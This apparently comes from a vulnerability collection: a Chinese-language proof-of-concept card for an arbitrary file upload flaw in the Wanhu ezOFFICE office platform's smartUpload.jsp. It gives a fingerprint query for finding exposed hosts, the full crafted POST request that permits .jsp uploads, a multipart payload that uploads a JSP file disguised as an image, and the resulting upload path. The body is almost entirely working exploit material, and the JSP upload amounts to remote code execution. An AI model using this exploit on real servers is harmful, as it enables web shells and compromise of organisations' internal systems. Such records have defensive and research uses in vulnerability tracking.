# 万户协同办公平台smartUpload存在任意文件上传漏洞

- **系统**：万户协同办公平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`POST /defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 195`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="photo"; filename="hello.jsp"
Content-Type: image/jpeg
<% out.println("435352Els1K9wZvOlSsdsdmrg"); %>
--00content0boundary00--

根据回显拼接上传文件地址
/defaultroot/upload/information/2024022615565599901279323.jsp
```

**其他**
- 万户协同办公平台 smartUpload存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezoffice